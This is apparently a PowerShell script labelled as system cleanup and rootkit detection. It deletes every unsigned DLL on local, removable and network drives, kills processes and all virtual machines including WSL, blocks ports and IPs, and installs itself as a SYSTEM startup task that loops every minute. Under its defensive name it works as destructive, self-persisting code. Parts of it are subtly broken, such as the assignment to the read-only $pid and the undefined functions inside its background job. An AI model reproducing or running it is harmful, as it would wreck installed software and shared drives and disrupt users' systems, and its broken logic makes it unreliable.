function Remove-SuspiciousDLLs {
    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { 
        $_.DriveType -in @('Fixed', 'Removable', 'Network') 
    }
    $dlls = Get-ChildItem -Recurse -Path $drives.Root -Filter "*.dll" -ErrorAction SilentlyContinue
    foreach ($dll in $dlls) {
        $cert = Get-AuthenticodeSignature $dll.FullName
        if ($cert.Status -ne "Valid") {
            $processes = Get-WmiObject Win32_Process | Where-Object { 
                $_.CommandLine -like "*$($dll.FullName)*" 
            }
            foreach ($process in $processes) {
                Stop-Process -Id $process.ProcessId -Force
            }
            takeown /f $dll.FullName /A
            Remove-Item $dll.FullName -Force -ErrorAction SilentlyContinue
        }
    }
}

function Detect-AndBlockRootkit {
    # Define legitimate applications and system processes
    $allowedApps = @(
        "httpd", "nginx", "w3wp", "tomcat", "node", "python", "ruby", "java",
        "chrome", "firefox", "msedge", "opera", "safari", "brave", "vivaldi", "tor"
    )
    $criticalProcesses = @(
        "svchost", "csrss", "smss", "wininit", "services", "lsass", "winlogon", "System", "explorer"
    )
    $excludedProcesses = $allowedApps + $criticalProcesses
    $logPath = "C:\Logs\RootkitDetection.log"

    # Create log directory
    if (-not (Test-Path "C:\Logs")) {
        New-Item -ItemType Directory -Path "C:\Logs" -Force | Out-Null
    }

    # Get TCP connections (equivalent to netstat -ano)
    $connections = Get-NetTCPConnection -ErrorAction SilentlyContinue | 
        Where-Object { $_.State -eq "Listen" -or $_.State -eq "Established" }

    if ($null -eq $connections) {
        $logMessage = "$(Get-Date): No TCP connections detected (netstat -ano equivalent returned empty). Checking for suspicious traffic."
        Write-Host $logMessage
        Add-Content -Path $logPath -Value $logMessage
        
        # Check for non-local traffic as a fallback
        $suspiciousTraffic = Get-NetTCPConnection -ErrorAction SilentlyContinue | 
            Where-Object { $_.RemoteAddress -notlike "192.168.*" -and $_.RemoteAddress -notlike "10.*" -and $_.RemoteAddress -notlike "172.16.*" -and $_.RemoteAddress -ne "127.0.0.1" }
        foreach ($traffic in $suspiciousTraffic) {
            $remoteIP = $traffic.RemoteAddress
            $remotePort = $traffic.RemotePort
            $logMessage = "$(Get-Date): Detected suspicious non-local traffic to ${remoteIP}:${remotePort}. Blocking IP."
            Write-Host $logMessage
            Add-Content -Path $logPath -Value $logMessage
            New-NetFirewallRule -DisplayName "Block-IP-$remoteIP" -Direction Inbound -RemoteAddress $remoteIP -Action Block -ErrorAction SilentlyContinue
            New-NetFirewallRule -DisplayName "Block-IP-$remoteIP-Out" -Direction Outbound -RemoteAddress $remoteIP -Action Block -ErrorAction SilentlyContinue
        }
        return
    }

    foreach ($conn in $connections) {
        $pid = $conn.OwningProcess
        $process = Get-Process -Id $pid -ErrorAction SilentlyContinue
        $localPort = $conn.LocalPort
        $remotePort = $conn.RemotePort
        $localIP = $conn.LocalAddress
        $remoteIP = $conn.RemoteAddress
        $state = $conn.State

        # Check for invisible or unauthorized processes
        if ($null -eq $process -or $excludedProcesses -notcontains $process.Name) {
            $processName = if ($process) { $process.Name } else { "Unknown (Invisible)" }
            $processPath = if ($process) { $process.Path } else { "N/A" }
            $logMessage = "$(Get-Date): Detected unauthorized/invisible process (Name: $processName, PID: $pid) on Local: ${localIP}:${localPort}, Remote: ${remoteIP}:${remotePort}, State: $state, Path: $processPath"
            Write-Host $logMessage
            Add-Content -Path $logPath -Value $logMessage

            # Kill the process if PID exists
            if ($pid) {
                Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
            }

            # Block the port (local for Listen, remote for Established)
            $targetPort = if ($state -eq "Listen") { $localPort } else { $remotePort }
            $ruleName = "Block-Port-$targetPort"
            New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Protocol TCP -LocalPort $targetPort -Action Block -ErrorAction SilentlyContinue
            New-NetFirewallRule -DisplayName "$ruleName-Out" -Direction Outbound -Protocol TCP -LocalPort $targetPort -Action Block -ErrorAction SilentlyContinue

            # Block local IP if not the PC itself (e.g., router)
            if ($localIP -ne "0.0.0.0" -and $localIP -ne "127.0.0.1" -and $localIP -notlike "[::]*") {
                New-NetFirewallRule -DisplayName "Block-IP-$localIP" -Direction Inbound -RemoteAddress $localIP -Action Block -ErrorAction SilentlyContinue
                New-NetFirewallRule -DisplayName "Block-IP-$localIP-Out" -Direction Outbound -RemoteAddress $localIP -Action Block -ErrorAction SilentlyContinue
            }

            # Block remote IP if not local (e.g., C2 server)
            if ($remoteIP -ne "0.0.0.0" -and $remoteIP -notlike "192.168.*" -and $remoteIP -notlike "10.*" -and $remoteIP -notlike "172.16.*") {
                New-NetFirewallRule -DisplayName "Block-IP-$remoteIP" -Direction Inbound -RemoteAddress $remoteIP -Action Block -ErrorAction SilentlyContinue
                New-NetFirewallRule -DisplayName "Block-IP-$remoteIP-Out" -Direction Outbound -RemoteAddress $remoteIP -Action Block -ErrorAction SilentlyContinue
            }
        }
    }
}

function Stop-AllVMs {
    $vmProcesses = @(
        "vmware-vmx", "vmware", "vmware-tray", "vmwp", "vmnat", "vmnetdhcp", "vmware-authd", 
        "vmms", "vmcompute", "vmsrvc", "vmwp", "hvhost", "vmmem", 
        "VBoxSVC", "VBoxHeadless", "VirtualBoxVM", "VBoxManage", "qemu-system-x86_64", 
        "qemu-system-i386", "qemu-system-arm", "qemu-system-aarch64", "kvm", "qemu-kvm", 
        "prl_client_app", "prl_cc", "prl_tools_service", "prl_vm_app", "bhyve", "xen", 
        "xenservice", "bochs", "dosbox", "utm", "wsl", "wslhost", "vmmem", "simics", 
        "vbox", "parallels"
    )
    $processes = Get-Process -ErrorAction SilentlyContinue
    $vmRunning = $processes | Where-Object { $vmProcesses -contains $_.Name }
    if ($vmRunning) {
        $vmRunning | Format-Table -Property Id, Name, Description -AutoSize
        foreach ($process in $vmRunning) {
            Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        }
    }
}

# Create destination folder and copy script
$destPath = "$env:windir\Setup\Scripts\Bin"
$scriptPath = "$destPath\SystemCleanup.ps1"
$currentScript = $MyInvocation.MyCommand.Path

try {
    # Create directory if it doesn't exist
    if (-not (Test-Path $destPath)) {
        New-Item -ItemType Directory -Path $destPath -Force | Out-Null
    }
    
    # Copy this script to destination
    Copy-Item -Path $currentScript -Destination $scriptPath -Force
    
    # Create scheduled task
    $taskName = "SystemCleanupTask"
    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $scriptPath"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    # Register the task (overwrite if exists)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
}
catch {
    Write-Error "Failed to set up script persistence: $_"
}

# Start background job
Start-Job -ScriptBlock {
    while ($true) {
        Stop-AllVMs
        Remove-SuspiciousDLLs
        Detect-AndBlockRootkit
        Start-Sleep -Seconds 60
    }
} | Out-Null